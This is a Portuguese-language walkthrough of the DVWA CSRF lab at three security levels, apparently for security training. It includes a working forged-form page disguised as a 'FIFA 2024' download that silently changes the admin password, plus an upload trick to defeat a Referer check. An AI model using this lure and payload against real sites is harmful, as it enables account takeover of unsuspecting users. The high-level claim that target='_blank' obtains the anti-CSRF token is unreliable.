CSRF Vulnerability

Cross-site Request Forgery (CSRF) é um tipo de ataque de websites maliciosos. 
Um ataque CSRF às vezes é chamado de ataque de um clique ou transporte de sessão. 
Esse tipo de ataque envia solicitações desautorizadas de um usuário no qual o website confia.

LOW 

Obs: CSRF, para explorar, primeiro teremos que ir em DVWA Security, e colocaremos no modo low

Obs: Precisa está logado com sessão ativa

1 = Aqui teremos que criar uma página fake para que o usuário clique
e em seguida, através do transporte de sessão, podemos alterar a senha.
Neste caso, vamos até a pasta no caminho

/DVWA/HELP DVWA /2 = CSRF/index e vamos executar o arquivo index.html

No momento que o usuário clicar em Download o link irá encaminhar para a URL logo abaixo

http://10.60.4.63/DVWA/vulnerabilities/csrf/?password_new=123456789&password_conf=123456789&Change=Change#

Portanto a senha será definida para 123456789

2 = Para ver se deu certo, deslogue da conta, volte na inicial de login e coloque

login: admin
password: 123456789


Código fonte logo abaixo:

index.html

<html>
	</head>
		<body>
			<div class="bg-img">
			<div class="content">
				<header>Click to Download FIFA 2024</header>

				<!--http://10.60.4.63/DVWA/vulnerabilities/csrf/?password_new=123456789&password_conf=123456789&Change=Change#-->
				
				<form action="http://10.60.4.63/DVWA/vulnerabilities/csrf/" method="get">
				
				<div class="field">
					<input type="hidden" name="password_new" value="123456789">
					<input type="hidden" name="password_conf" value="123456789">
					<input type="hidden" name="Change" value="Change">
					<input type="submit" name="Download" value="Download">
				</div>
				</form>
			</div>
			</div>
		</body>
</html>



====================================================================================================

MEDIUM

$_SERVER[ 'HTTP_REFERER' ]

O campo referer [sic][nota 1] é um campo de cabeçalho HTTP que identifica o 
endereço da página web (p.e. o URI ou IRI) que está ligado ao recurso que está 
sendo solicitado. Pela verificação do referer, a nova página web pode ver de 
onde a requisição se originou. Em suma: saber de onde o usuário veio, ou seja, 
qual página que ele estava que o mandou para seu site.

1 = Deste vez temos um problema, pois o comando $_SERVER[ 'HTTP_REFERER' ], está sendo
utilizado, isso significa que o sistema agora sabe de onde veio o arquivo
originalmente, e não vai aceitar qualquer solicitação que não seja
da origem correta

2 = Neste caso faça o update do arquivo index.html via upload

3 = Entre no caminho correto do UPDATE

http://10.60.4.63/DVWA/hackable/uploads/index.html

4 = Para confirmar logout e depois

login: admin
password: 123456789

====================================================================================================

HARD

1 = Para resolver neste nível, temos que adicionar ao forms a opção 

target="_blank"

Onde no momento que a página abrir uma nova guia o token será inserido
pois o recarregamento foi solicitado direto pelo servidor. No caso
ficou deste forma. 

  </head>
  <body>
    <div class="bg-img">
      <div class="content">
        <header>Click to Download FIFA 2024</header>

        <!--http://10.60.4.63/DVWA/vulnerabilities/csrf/?password_new=123456789&password_conf=123456789&Change=Change#-->
        
        <form target="_blank" action="http://10.60.4.63/DVWA/vulnerabilities/csrf/" method="get">
          
          <div class="field">
            <input type="hidden" name="password_new" value="123456789">
            <input type="hidden" name="password_conf" value="123456789">
            <input type="hidden" name="Change" value="Change">
			      <input type="submit" value="Download">
          </div>
        </form>
      </div>
    </div>


  </body>
</html>



